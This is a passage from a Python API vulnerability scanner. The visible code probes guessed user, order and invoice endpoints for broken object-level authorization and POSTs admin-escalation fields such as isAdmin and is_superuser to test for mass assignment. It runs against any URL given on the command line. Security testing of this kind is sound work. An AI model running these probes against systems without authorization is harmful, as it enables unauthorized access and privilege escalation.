        id_endpoints = [
            "/api/users/", "/users/", "/api/products/", "/products/",
            "/api/orders/", "/orders/", "/api/invoices/", "/invoices/"
        ]
        
        test_ids = ["1", "2", "123", "admin", "test"]
        
        for endpoint in id_endpoints:
            for test_id in test_ids:
                test_url = urljoin(base_url, endpoint + test_id)
                try:
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check if we can access other users' data
                    if response.status_code == 200 and any(indicator in response.text for indicator in ["email", "password", "admin", "user"]):
                        self.vulnerabilities.append({
                            "type": "Broken Object Level Authorization",
                            "url": test_url,
                            "method": "GET",
                            "params": {"id": test_id},
                            "evidence": "Access to object without proper authorization",
                            "severity": "High"
                        })
                        self.print_status(f"BOLA vulnerability found at {test_url}", "vuln")
                except:
                    pass
    
    def test_mass_assignment(self, base_url):
        """Test for Mass Assignment vulnerabilities"""
        self.print_status("Testing for Mass Assignment vulnerabilities", "advanced")
        
        # Test endpoints that might be vulnerable to mass assignment
        mass_assignment_endpoints = [
            "/api/users", "/users", "/api/products", "/products",
            "/api/register", "/register", "/api/profile", "/profile"
        ]
        
        # Test with common admin parameters
        admin_params = {
            "isAdmin": True,
            "admin": True,
            "role": "admin",
            "permissions": "all",
            "is_active": True,
            "is_superuser": True
        }
        
        for endpoint in mass_assignment_endpoints:
            test_url = urljoin(base_url, endpoint)
            
            try:
                # Test with POST request
                response = self.session.post(test_url, json=admin_params, timeout=10)
                
                # Check if we successfully set admin parameters
                if response.status_code == 200 and any(indicator in response.text for indicator in ["admin", "true", "superuser"]):
                    self.vulnerabilities.append({
                        "type": "Mass Assignment",
                        "url": test_url,
                        "method": "POST",
                        "params": admin_params,
                        "evidence": "Admin parameters accepted without authorization",
                        "severity": "High"
                    })
                    self.print_status(f"Mass Assignment vulnerability found at {test_url}", "vuln")
            except:
                pass
    
    def scan(self, target_url):
        """Main scanning function"""
        self.print_status(f"Starting advanced scan of {target_url}", "info")
        
        # Discover endpoints
        endpoints = self.find_endpoints(target_url)
        endpoints.append(target_url)  # Also test the base URL
        self.discovered_endpoints = endpoints
        
        # Test authentication
        self.test_auth(target_url)
        
        # Test CORS
        self.test_cors(target_url)
        
        # Test SSRF
        self.test_ssrf(target_url)
        
        # Test XXE
        self.test_xxe(target_url)
        
        # Test SSTI
        self.test_ssti(target_url)
        
        # Test NoSQL Injection
        self.test_nosql_injection(target_url)
        
        # Test GraphQL Injection
        self.test_graphql_injection(target_url)
        
        # Test Prototype Pollution
        self.test_prototype_pollution(target_url)
        
        # Test rate limiting
        self.test_rate_limiting(target_url)
        
        # Test HTTP methods
        self.test_http_methods(target_url)
        
        # Test BOLA
        self.test_broken_object_level_auth(target_url)
        
        # Test Mass Assignment
        self.test_mass_assignment(target_url)
        
        # Test each endpoint with different HTTP methods
        for endpoint in endpoints:
            for method in ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]:
                self.test_endpoint(endpoint, method)
                
                # Test with parameters for POST/PUT/PATCH
                if method in ["POST", "PUT", "PATCH"]:
                    test_data = {"test": "payload", "id": 1, "name": "test", "email": "test@example.com"}
                    self.test_endpoint(endpoint, method, data=test_data)
            
            # Fuzz parameters for GET endpoints
            if '?' in endpoint:
                self.fuzz_parameters(endpoint)
        
        # Test JWT tokens for vulnerabilities
        self.test_jwt_vulnerabilities()
        
        # Generate report
        self.generate_report()
    
    def generate_report(self):
        """Generate a comprehensive vulnerability report"""
        print(f"\n{Colors.CYAN}{'='*80}{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}ADVANCED API SECURITY SCAN REPORT{Colors.END}")
        print(f"{Colors.CYAN}{'='*80}{Colors.END}")
        
        if not self.vulnerabilities:
            self.print_status("No vulnerabilities found!", "success")
            return
        
        # Count vulnerabilities by severity
        high_count = sum(1 for v in self.vulnerabilities if v['severity'] == 'High')
        medium_count = sum(1 for v in self.vulnerabilities if v['severity'] == 'Medium')
        low_count = sum(1 for v in self.vulnerabilities if v['severity'] == 'Low')
        
        print(f"\n{Colors.BOLD}Summary:{Colors.END}")
        print(f"{Colors.RED}High: {high_count}{Colors.END}")
        print(f"{Colors.YELLOW}Medium: {medium_count}{Colors.END}")
        print(f"{Colors.BLUE}Low: {low_count}{Colors.END}")
        print(f"{Colors.BOLD}Total: {len(self.vulnerabilities)}{Colors.END}")
        
        # Group vulnerabilities by type
        vuln_by_type = {}
        for vuln in self.vulnerabilities:
            if vuln['type'] not in vuln_by_type:
                vuln_by_type[vuln['type']] = []
            vuln_by_type[vuln['type']].append(vuln)
        
        print(f"\n{Colors.BOLD}Vulnerabilities by Type:{Colors.END}")
        for vuln_type, vulns in vuln_by_type.items():
            severity_color = Colors.RED if any(v['severity'] == 'High' for v in vulns) else Colors.YELLOW if any(v['severity'] == 'Medium' for v in vulns) else Colors.BLUE
            print(f"{severity_color}{vuln_type}: {len(vulns)}{Colors.END}")
        
        self.print_status(f"\nFound {len(self.vulnerabilities)} vulnerabilities:", "warning")
        
        # Print detailed vulnerabilities
        for i, vuln in enumerate(self.vulnerabilities, 1):
            color = Colors.RED if vuln['severity'] == 'High' else Colors.YELLOW if vuln['severity'] == 'Medium' else Colors.BLUE
            print(f"\n{color}{i}. {vuln['type']} ({vuln['severity']}){Colors.END}")
            print(f"   URL: {vuln['url']}")
            print(f"   Method: {vuln['method']}")
            if vuln.get('params'):
                print(f"   Parameters: {vuln['params']}")
            print(f"   Evidence: {vuln['evidence']}")
        
        # Print sensitive data findings
        if self.sensitive_data:
            print(f"\n{Colors.CYAN}{'='*80}{Colors.END}")
            print(f"{Colors.CYAN}{Colors.BOLD}SENSITIVE DATA FINDINGS{Colors.END}")
            print(f"{Colors.CYAN}{'='*80}{Colors.END}")
            
            for i, data in enumerate(self.sensitive_data, 1):
                print(f"\n{Colors.CYAN}{i}. {data['type']}{Colors.END}")
                print(f"   URL: {data['url']}")
                print(f"   Value: {data['value'][:100]}{'...' if len(data['value']) > 100 else ''}")

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print("Example: python advanced_api_tester.py https://api.example.com")
        print("Example: python advanced_api_tester.py http://localhost:8000")
        sys.exit(1)
    
    target_url = sys.argv[1]
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    tester = AdvancedAPITester()
    tester.scan(target_url)

if __name__ == "__main__":
    main()